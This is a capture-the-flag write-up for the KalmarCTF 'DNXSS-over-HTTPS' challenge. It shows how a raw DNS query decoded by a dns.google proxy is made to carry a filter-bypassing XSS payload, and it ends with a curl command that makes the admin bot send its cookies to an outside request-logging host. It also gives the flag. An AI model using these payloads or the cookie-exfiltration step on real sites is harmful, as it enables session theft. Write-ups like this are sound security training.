---
tags:
  - xss
  - dns
  - raw
  - filter-bypass
references:
---
# DNXSS-over-HTTPS
## Description
> Do you like DNS-over-HTTPS? Well, I'm proxying https://dns.google/! Would be cool if you can find an XSS!
  Report to admin locally:
  `curl http://localhost:8008/report -H "Content-Type: application/json" -d '{"url":"http://proxy/"}'`
  Report to admin for the real flag:
  `curl https://dnxss.chal-kalmarc.tf/report -H "Content-Type: application/json" -d '{"url":"http://proxy/"}'`
  https://dnxss.chal-kalmarc.tf/
## Overview
The app is a proxy to dns.google.
```
http {
  server {
    listen 80;
    location / {
      proxy_pass https://dns.google;
      add_header Content-Type text/html always;
    }
    location /report {
      proxy_pass http://adminbot:3000;
    }
  }
}
```
## Road to flag
There's an admin bot that sets the flag in its cookies -> XSS
## Exploitation

- `/resolve` encodes all special chars -> no xss
- `/dns-query` decodes valid base64 dns requests -> What if I could build a valid raw dns query that when decoded can be rendered as HTML?
	- **Challenges**: in the raw query i can't use: template strings, dots, plus, and the string has to be less than 63 chars

**Solution**
- XSS payload: `<svg/onload=eval(decodeURI("'"["concat"](location)))/></svg>`

1. Get the raw query by requesting:
`https://dns.google/resolve?name=%3Csvg/onload=eval(decodeURI(%22%27%22[%22concat%22](location)))/%3E%3C/svg%3E.997asfy8.requestrepo.com&type=TXT`
2. Decode the query and adjust the string case (`<svg/ONlOAd=EVal(deCodeuRI("'"["coNcaT"](locatION)))/></SvG>` -> `<svg/onload=eval(decodeURI("'"["concat"](location)))/></svg>`)
I used [Cyberchef](<https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')From_Base64('A-Za-z0-9%2B/%3D',false,false/disabled)URL_Encode(true/disabled)URL_Encode(false/disabled)&input=jb0AEAABAAAAAAABPD48c3ZnL29ubG9hZD1ldmFsKGRlY29kZVVSSSgiJyJbImNvbmNhdCJdKGxvY2F0aW9uKSkpPjwvc3ZnPgg5OTdBU0Z5OAtyZVF1RXNUcmVwbwNDb00AABAAAQAAKQV4AACAAAAA&ieol=VT&oeol=VT>)
3. Verify that the xss triggers
`https://dnxss.chal-kalmarc.tf/dns-query?x=';alert()//&dns=jb0AEAABAAAAAAABPD48c3ZnL29ubG9hZD1ldmFsKGRlY29kZVVSSSgiJyJbImNvbmNhdCJdKGxvY2F0aW9uKSkpPjwvc3ZnPgg5OTdBU0Z5OAtyZVF1RXNUcmVwbwNDb00AABAAAQAAKQV4AACAAAAA
4. Get the flag
```sh
curl https://dnxss.chal-kalmarc.tf/report -H "Content-Type: application/json" -d '{"url":"http://proxy/dns-query?x=%27;location=%27//997asfy8.requestrepo.com?%27+document.cookie//&dns=jb0AEAABAAAAAAABPD48c3ZnL29ubG9hZD1ldmFsKGRlY29kZVVSSSgiJyJbImNvbmNhdCJdKGxvY2F0aW9uKSkpPjwvc3ZnPgg5OTdBU0Z5OAtyZVF1RXNUcmVwbwNDb00AABAAAQAAKQV4AACAAAAA"}'
```

`kalmar{that_content_type_header_is_doing_some_heavy_lifting!_did_you_use_dns-query_or_resolve?}`
